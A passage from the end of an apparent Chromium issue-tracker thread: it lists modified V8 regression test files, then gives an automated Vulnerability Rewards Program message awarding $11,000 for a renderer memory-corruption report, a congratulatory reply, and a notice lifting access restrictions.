  * M `test/mjsunit/regress/regress-11491.js`
  * M `test/mjsunit/regress/regress-crbug-724153.js`
  * M `test/mjsunit/regress/regress-v8-6716.js`
  * M `test/mjsunit/turboshaft/maglev-frontend/regress-359266991.js`

* * *

Hash: f6961c4066a99a774c97eb3a3939aa5489464eae  
Date: Mon Feb 10 14:31:16 2025

* * *


---

**#18 — sp...@google.com — Feb 15, 2025 07:55AM**

** NOTE: This is an automatically generated email **  
  
Hello,  
  
Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $11000.00 for this report.  
  
Rationale for this decision:  
$10,000 for high quality report of memory corruption in a sandboxed process / the renderer + $1,000 bisect bonus  
  
  
Important: If you aren't already registered with Google as a supplier, [p2p-vrp@google.com](<mailto:p2p-vrp@google.com>) will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.  
  
If you have any payment related requests, please direct them to [p2p-vrp@google.com](<mailto:p2p-vrp@google.com>). Please remember to include the subject of this email and the email address that the report was sent from.  
  
  
Thank you for your efforts and helping us make Chrome more secure for all users!  
  
Cheers,  
Chrome VRP Panel Bot  
  
  
P.S. One other thing we'd like to mention:  
  
* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.  
Please contact [security-vrp@chromium.org](<mailto:security-vrp@chromium.org>) with any questions.


---

**#19 — am...@chromium.org — Feb 15, 2025 08:15AM**

And another one! Congratulations and thank you for your effort and reporting this issue to us, Seunghyun -- great work!


---

**#20 — ch...@google.com — May 16, 2025 09:43PM**

This bug has been closed for more than 14 weeks. Removing issue access restrictions.
